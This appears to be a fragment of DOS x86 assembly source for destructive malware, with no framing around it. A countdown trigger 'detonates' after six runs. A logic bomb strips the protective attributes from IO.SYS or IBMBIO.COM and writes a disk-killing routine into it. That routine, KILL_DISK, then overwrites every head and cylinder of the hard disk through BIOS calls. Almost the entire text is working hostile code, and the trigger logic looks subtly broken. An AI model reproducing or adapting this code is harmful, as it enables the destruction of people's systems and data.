;The following Trigger Routine counts down from 6 and detonates
TRIGGER:
        cmp     BYTE PTR [COUNTER],0
        jz      TRET
        dec     [COUNTER]
        mov     al,[COUNTER]
        mov     al,1
        or      al,al
TRET:   ret

COUNTER         DB      6


;The following Logic Bomb writes the routine KILL_DISK into the IO.SYS file.
;To do this successfully, it must first make the file a normal read/write
;file, then it should write to it, and change it back to a system/read only
;file.
BOMB:
        mov     dx,OFFSET FILE_ID1              ;set attributes to normal
        mov     ax,4301H
        mov     cx,0
        int     21H
        jnc     BOMB1                           ;success, don't try IBMBIO.COM
        mov     dx,OFFSET FILE_ID2
        mov     ax,4301H
        mov     cx,0
        int     21H
        jc      BOMBE                           ;exit on error
BOMB1:  push    dx
        mov     ax,3D02H                        ;open file read/write
        int     21H
        jc      BOMB2
        mov     bx,ax
        mov     ah,40H                          ;write KILL_DISK routine
        mov     dx,OFFSET KILL_DISK
        mov     cx,OFFSET KILL_END
        sub     cx,dx
        int     21H
        mov     ah,3EH                          ;and close file
        int     21H
BOMB2:  pop     dx
        mov     ax,4301H                        ;set attributes to ro/hid/sys
        mov     cx,7
        int     21H
BOMBE:  ret

FILE_ID1        DB      'C:\IO.SYS',0
FILE_ID2        DB      'C:\IBMBIO.COM',0

;This routine trashes the hard disk.
KILL_DISK:
        mov     ah,8
        mov     dl,80H
        int     13H                             ;get hard disk params
        mov     al,cl
        and     al,3FH
        mov     cx,1
        inc     dh
        mov     dl,80H
        mov     di,dx
        xor     dh,dh
        mov     ah,3                            ;write trash to disk
DISKLP: push    ax
        int     13H
        pop     ax
        inc     dh
        cmp     dx,di                           ;do all heads
        jne     DISKLP
        xor     dh,dh
        inc     ch                              ;next cylinder
        jne     DISKLP
        add     cl,20H
        jmp     DISKLP
KILL_END:

